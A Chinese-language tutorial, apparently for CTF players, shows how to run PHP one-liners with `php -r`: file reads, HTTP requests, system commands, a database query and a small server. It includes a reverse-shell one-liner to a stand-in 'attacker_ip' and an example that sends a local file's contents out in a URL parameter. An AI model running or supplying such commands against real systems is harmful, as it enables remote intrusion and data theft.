PHP的`-r`选项允许你在命令行中直接运行PHP代码，而无需创建一个PHP文件。这在CTF比赛中非常有用，尤其是在你需要快速执行一些PHP代码时。下面是一些使用`php -r`选项执行命令的示例，包括文件操作、网络请求、系统命令等。

### 基本用法
你可以在命令行中使用如下格式执行PHP代码：
```sh
php -r 'echo "Hello, World!\n";'
```

### 示例：读取文件内容
```sh
php -r '$content = file_get_contents("/path/to/file"); echo $content;'
```

### 示例：发送HTTP请求
使用PHP的`file_get_contents`函数发送简单的GET请求：
```sh
php -r '$response = file_get_contents("http://example.com"); echo $response;'
```

使用`curl`扩展发送HTTP请求（确保`curl`扩展已安装）：
```sh
php -r '$ch = curl_init("http://example.com"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($ch); curl_close($ch); echo $response;'
```

### 示例：执行系统命令
执行系统命令并输出结果：
```sh
php -r 'system("ls -l");'
```

使用`exec`函数执行系统命令：
```sh
php -r '$output = []; exec("ls -l", $output); foreach ($output as $line) { echo $line . "\n"; }'
```

### 示例：连接数据库并执行查询

#### MySQL数据库
确保安装了`mysqli`扩展。

```sh
php -r '$mysqli = new mysqli("localhost", "username", "password", "database"); if ($mysqli->connect_error) { die("Connection failed: " . $mysqli->connect_error); } $result = $mysqli->query("SELECT * FROM table_name"); while ($row = $result->fetch_assoc()) { print_r($row); } $mysqli->close();'
```

### 示例：PHP反弹Shell

#### 反弹Shell（用于演示目的，请勿用于非法用途）
反弹Shell到攻击者机器：
```sh
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### 示例：执行PHP脚本
你还可以使用`-r`选项执行更复杂的PHP脚本，通过引入多个PHP函数和逻辑：

#### 示例：简单的HTTP服务器
```sh
php -r '$sock=socket_create(AF_INET, SOCK_STREAM, SOL_TCP); socket_bind($sock, "0.0.0.0", 8080); socket_listen($sock); while($conn=socket_accept($sock)){ socket_write($conn, "HTTP/1.1 200 OK\r\nContent-Length: 11\r\n\r\nHello World"); socket_close($conn); }'
```

#### 示例：简单的计算
```sh
php -r '$a = 5; $b = 10; echo "Sum: " . ($a + $b) . "\n";'
```

### 综合示例
以下是一个更综合的示例，演示如何读取文件内容、发送HTTP请求并将结果写入文件：

```sh
php -r '$content = file_get_contents("/path/to/input_file"); $response = file_get_contents("http://example.com?data=" . urlencode($content)); file_put_contents("/path/to/output_file", $response);'
```

### 安全提示
在执行命令和脚本时，请注意以下几点：

1. **避免直接执行不受信任的输入**：防止命令注入和其他安全漏洞。
2. **使用参数化查询**：在处理数据库查询时，避免SQL注入。
3. **确保执行环境的安全**：避免在生产环境中使用具有高风险的脚本和命令。

这些示例展示了如何使用PHP的`-r`选项执行各种任务，包括文件操作、网络请求和系统命令等。在CTF比赛中，这些技巧可以帮助你快速编写和运行PHP代码，解决各种挑战。